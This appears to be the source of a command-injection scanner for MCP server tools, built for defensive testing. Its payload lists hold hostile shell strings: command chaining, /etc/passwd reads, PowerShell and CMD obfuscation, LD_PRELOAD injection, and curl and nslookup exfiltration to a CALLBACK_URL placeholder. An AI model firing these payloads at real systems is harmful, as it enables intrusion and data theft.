"""
Command Injection Scanner — detects arbitrary command execution vulnerabilities in MCP tools.

Tests 150+ payloads across 8 categories:
  1. Basic shell metacharacters (Unix + Windows)
  2. Encoding bypasses (URL, double-URL, Unicode, null byte)
  3. Shell-specific bypasses (Bash, PowerShell, CMD)
  4. Argument injection
  5. Environment variable injection
  6. Time-based blind injection
  7. Out-of-band exfiltration
  8. Filter bypass techniques
"""

from __future__ import annotations

import re
import logging
import getpass
import time
from typing import Any

from mcpsec.client.mcp_client import MCPSecClient
from mcpsec.models import Finding, Severity, ServerProfile, ToolInfo
from mcpsec.scanners.base import BaseScanner

logger = logging.getLogger(__name__)

# ─── Parameter keywords ─────────────────────────────────────────────────────

COMMAND_PARAM_KEYWORDS = [
    "command", "target", "host", "cmd", "query", "input", "args", "arguments",
    "script", "exec", "run", "payload", "shell", "program", "bin", "process",
    "expression", "eval", "code", "statement", "action", "task",
]

# ─── Payloads by category ───────────────────────────────────────────────────

PAYLOADS: dict[str, list[str]] = {
    # ═══════════════════════════════════════════════════════════════
    # CATEGORY 1: BASIC SHELL METACHARACTERS
    # Test fundamental command chaining/injection operators
    # ═══════════════════════════════════════════════════════════════
    "basic_unix": [
        "; id",
        "| id",
        "|| id",
        "& id",
        "&& id",
        "$(id)",
        "`id`",
        "\n id",
        "\r\n id",
        "$((1+1))",
        "; whoami",
        "| whoami",
        "& whoami",
        "; echo MCPSEC_INJECTED",
        "| echo MCPSEC_INJECTED",
        "& echo MCPSEC_INJECTED",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "$(cat /etc/passwd)",
    ],

    "basic_windows": [
        "& whoami",
        "| whoami",
        "|| whoami",
        "&& whoami",
        "\r\nwhoami",
        "%COMSPEC% /c whoami",
        "| powershell -c whoami",
        "& echo MCPSEC_INJECTED",
        "| echo MCPSEC_INJECTED",
        "& type C:\\windows\\win.ini",
    ],

    # ═══════════════════════════════════════════════════════════════
    # CATEGORY 2: ENCODING BYPASSES
    # When direct injection is blocked, try encoded variants
    # ═══════════════════════════════════════════════════════════════
    "url_encoding": [
        "%3B%20id",           # ; id
        "%7C%20id",           # | id
        "%26%20id",           # & id
        "%24%28id%29",        # $(id)
        "%60id%60",           # `id`
        "%0Aid",              # \n id
        "%3B%20whoami",       # ; whoami
        "%7C%20whoami",       # | whoami
    ],

    "double_url_encoding": [
        "%253B%2520id",       # Double encoded ; id
        "%257C%2520id",       # Double encoded | id
        "%2526%2520id",       # Double encoded & id
        "%250Aid",            # Double encoded \n id
    ],

    "unicode_normalization": [
        "\u037e id",          # Greek question mark (looks like ;)
        "\uff5c id",          # Fullwidth |
        "\uff06 id",          # Fullwidth &
        "\u2024id\u2024",     # One dot leader
        "\uff1b id",          # Fullwidth ;
    ],

    "null_byte_injection": [
        "test%00; id",
        "test\x00| id",
        "test%00.txt; id",
        "test%00; whoami",
        "test\x00&& id",
    ],

    # ═══════════════════════════════════════════════════════════════
    # CATEGORY 3: SHELL-SPECIFIC BYPASSES
    # Target specific shell interpreters
    # ═══════════════════════════════════════════════════════════════
    "bash_specific": [
        "${IFS}id",
        ";{id,}",
        "$'\\x69\\x64'",
        "${PATH:0:1}bin${PATH:0:1}id",
        "/???/i?",                     # Glob for /bin/id
        "$(printf '\\x69\\x64')",
        ";$'\\151\\144'",              # Octal id
        "$(echo${IFS}id)",
        ";$(whoami)",
        "a]||id",
        "${HOME:0:1}etc${HOME:0:1}passwd",
        "$(<${HOME:0:1}etc${HOME:0:1}passwd)",
    ],

    "powershell_specific": [
        "| iex(whoami)",
        "| &('who'+'ami')",
        "| $ExecutionContext.InvokeCommand.ExpandString('$(whoami)')",
        "| [System.Diagnostics.Process]::Start('whoami')",
        "; $a='who';$b='ami';iex($a+$b)",
        "| whoami | Out-String",
        "| Invoke-Expression 'whoami'",
        "| & whoami",
        "; Get-Content C:\\windows\\win.ini",
    ],

    "cmd_specific": [
        "| cmd /c whoami",
        "| cmd.exe /c whoami",
        "^| whoami",
        "| w^h^o^a^m^i",
        "|| for /f %i in ('whoami') do echo %i",
        "| cmd /v /c whoami",
        "& cmd /c echo MCPSEC_INJECTED",
        "| type C:\\windows\\win.ini",
    ],

    # ═══════════════════════════════════════════════════════════════
    # CATEGORY 4: ARGUMENT INJECTION
    # When command is fixed but arguments are injectable
    # ═══════════════════════════════════════════════════════════════
    "argument_injection": [
        "--help",
        "-h",
        "--version",
        "-v",
        "--",
        "-- --help",
        "-e id",
        "--exec=id",
        "-c id",
        "--command id",
        "-o /tmp/pwned",
        "--output=/etc/passwd",
        "$(< /etc/passwd)",
        "-n -e '\\x41\\x41\\x41'",
        "--json",
        "--format=json",
    ],

    # ═══════════════════════════════════════════════════════════════
    # CATEGORY 5: ENVIRONMENT VARIABLE INJECTION
    # Abuse env vars that affect command execution
    # ═══════════════════════════════════════════════════════════════
    "env_injection": [
        "LD_PRELOAD=/tmp/evil.so",
        "PATH=/tmp:$PATH",
        "BASH_ENV=/tmp/evil",
        "ENV=/tmp/evil",
        "SHELLOPTS=xtrace",
        "PS4='$(id)'",
        "PROMPT_COMMAND=id",
        "GLOBIGNORE=*",
    ],

    # ═══════════════════════════════════════════════════════════════
    # CATEGORY 6: TIME-BASED BLIND INJECTION
    # When no output is returned, use timing
    # ═══════════════════════════════════════════════════════════════
    "time_based": [
        "; sleep 3",
        "| sleep 3",
        "& sleep 3",
        "$(sleep 3)",
        "`sleep 3`",
        "; ping -c 3 127.0.0.1",
        "| timeout 3",
        "& ping -n 3 127.0.0.1",
        "&& sleep 3",
        "|| sleep 3",
    ],

    # ═══════════════════════════════════════════════════════════════
    # CATEGORY 7: OUT-OF-BAND (OOB) DATA EXFILTRATION
    # When no direct output, exfiltrate via DNS/HTTP
    # ═══════════════════════════════════════════════════════════════
    "oob_exfil": [
        "; curl http://CALLBACK_URL/$(whoami)",
        "; wget http://CALLBACK_URL/$(id)",
        "; nslookup $(whoami).CALLBACK_DOMAIN",
        "| curl -d @/etc/passwd http://CALLBACK_URL",
        "$(curl http://CALLBACK_URL/?d=$(cat /etc/passwd|base64))",
        "; powershell -c iwr http://CALLBACK_URL/$(whoami)",
    ],

    # ═══════════════════════════════════════════════════════════════
    # CATEGORY 8: FILTER BYPASS TECHNIQUES
    # Common WAF/filter evasion
    # ═══════════════════════════════════════════════════════════════
    "filter_bypass": [
        # Space alternatives
        ";{id}",
        ";id%09",
        ";id%0a",
        ";id$IFS",
        ";id${IFS}",

        # Quote bypass
        ";i'd'",
        ';i"d"',
        ";i\\d",

        # Keyword bypass (if 'id' is blocked)
        ";/bin/id",
        ";/usr/bin/id",
        ";/bin/cat /etc/passwd",
        ';"\\bin/id"',
        ";'/bin/id'",

        # Concatenation bypass
        ";i''d",
        ';i""d',
        ";$'i'd",
        ';wh""oami',
        ";wh''oami",
    ],
}

# ─── Success indicators ──────────────────────────────────────────────────────

SUCCESS_INDICATORS: dict[str, list[str]] = {
    "unix_id": [
        r"uid=\d+",
        r"gid=\d+",
        r"groups=\d+",
        r"uid=\d+\([^)]+\)",
    ],
    "unix_whoami": [
        r"^(root|[a-z_][a-z0-9_-]*)\s*$",
    ],
    "windows_whoami": [
        r"\\",
        r"NT AUTHORITY",
        r"BUILTIN",
    ],
    "file_read": [
        r"root:x?:0:0",
        r"\[extensions\]",
        r"\[fonts\]",
    ],
    "canary": [
        "MCPSEC_INJECTED",
        "MCPSEC_RCE_CONFIRMED",
    ],
    "error_leaks": [
        r"sh: .+: not found",
        r"bash: .+: command not found",
        r"'.*' is not recognized",
        r"CommandNotFoundException",
        r"cannot execute binary file",
    ],
}

_CURRENT_USER = ""
try:
    _CURRENT_USER = getpass.getuser().lower()
except Exception:
    pass

# Flatten all payloads into a single list for scanning
_ALL_PAYLOADS = []
for category_payloads in PAYLOADS.values():
    _ALL_PAYLOADS.extend(category_payloads)

# Backward-compatible alias (referenced by tests)
INJECTION_PAYLOADS = _ALL_PAYLOADS


def _extract_response(result: Any) -> str:
    """Extract text from an MCP tool call result."""
    text = ""
    if hasattr(result, 'content'):
        for block in result.content:
            if hasattr(block, 'text'):
                text += block.text
    return text


def _check_indicators(response_text: str) -> tuple[str, str]:
    """
    Check response text against success indicators.
    Returns (evidence, confidence) where confidence is 'CONFIRMED' or 'LIKELY'.
    """
    lower = response_text.lower()

    # Strong evidence: canary strings
    for canary in SUCCESS_INDICATORS["canary"]:
        if canary.lower() in lower:
            return f"Canary '{canary}' found in response", "CONFIRMED"

    # Strong evidence: unix id output
    for pattern in SUCCESS_INDICATORS["unix_id"]:
        if re.search(pattern, response_text):
            return f"Unix id output matched: {pattern}", "CONFIRMED"

    # Strong evidence: file contents
    for pattern in SUCCESS_INDICATORS["file_read"]:
        if re.search(pattern, response_text):
            return f"Sensitive file contents detected: {pattern}", "CONFIRMED"

    # Medium evidence: current user in response
    if _CURRENT_USER and _CURRENT_USER in lower:
        return f"Current username '{_CURRENT_USER}' found in response", "CONFIRMED"

    # Medium evidence: Windows whoami
    for pattern in SUCCESS_INDICATORS["windows_whoami"]:
        if re.search(pattern, response_text):
            return f"Windows identity indicator: {pattern}", "CONFIRMED"

    # Weak evidence: error messages that leak shell behavior
    for pattern in SUCCESS_INDICATORS["error_leaks"]:
        if re.search(pattern, response_text, re.IGNORECASE):
            return f"Shell error message detected: {pattern}", "LIKELY"

    return "", ""


class CommandInjectionScanner(BaseScanner):
    """
    Scans for command injection vulnerabilities using 150+ payloads
    across 8 attack categories with confirmation-based detection.
    """

    name = "command-injection"
    description = "Detect command injection vulnerabilities with 150+ categorized payloads"

    async def scan(self, profile: ServerProfile, client: MCPSecClient | None = None) -> list[Finding]:
        findings: list[Finding] = []
        if not client:
            return findings

        for tool in profile.tools:
            # Test ALL string-type parameters, plus keyword matches
            injectable_params = set()

            # Keyword matching (high priority)
            for param_name in tool.parameters:
                if any(kw in param_name.lower() for kw in COMMAND_PARAM_KEYWORDS):
                    injectable_params.add(param_name)

            # Also test any string-type parameters from schema
            raw_props = tool.raw_schema.get("inputSchema", {}).get("properties", {})
            for param_name, param_def in raw_props.items():
                if param_def.get("type") == "string":
                    injectable_params.add(param_name)

            # Fall back to all params if none matched
            if not injectable_params:
                injectable_params = set(tool.parameters.keys())

            for param_name in injectable_params:
                found_vuln = False
                for payload in _ALL_PAYLOADS:
                    if found_vuln:
                        break
                    try:
                        # Time the request for blind detection
                        start = time.monotonic()
                        result = await client.call_tool(tool.name, {param_name: payload})
                        elapsed = time.monotonic() - start

                        response_text = _extract_response(result)
                        is_error = getattr(result, 'isError', False)

                        # Check indicators
                        evidence, confidence = _check_indicators(response_text)

                        # Time-based blind detection (>2.5s for sleep 3 payloads)
                        if not evidence and "sleep" in payload and elapsed > 2.5:
                            evidence = f"Time-based detection: {elapsed:.1f}s delay (expected ~3s from sleep payload)"
                            confidence = "LIKELY"

                        if evidence:
                            severity = Severity.CRITICAL if confidence == "CONFIRMED" else Severity.HIGH
                            findings.append(Finding(
                                severity=severity,
                                scanner=self.name,
                                tool_name=tool.name,
                                parameter=param_name,
                                title=f"Command Injection in '{param_name}' [{confidence}]",
                                description=(
                                    f"Tool '{tool.name}' is vulnerable to command injection "
                                    f"via the '{param_name}' parameter."
                                ),
                                detail=f"Payload: {payload}\nResponse: {response_text[:300]}",
                                evidence=evidence,
                                confidence=confidence.lower(),
                                remediation=(
                                    "Avoid passing user input to shell commands. "
                                    "Use subprocess.run(['cmd', 'arg'], shell=False). "
                                    "Validate input against a strict allowlist."
                                ),
                                cwe="CWE-78",
                            ))
                            found_vuln = True

                    except Exception as e:
                        logger.debug(f"Error testing {tool.name}/{param_name}: {e}")

        return findings
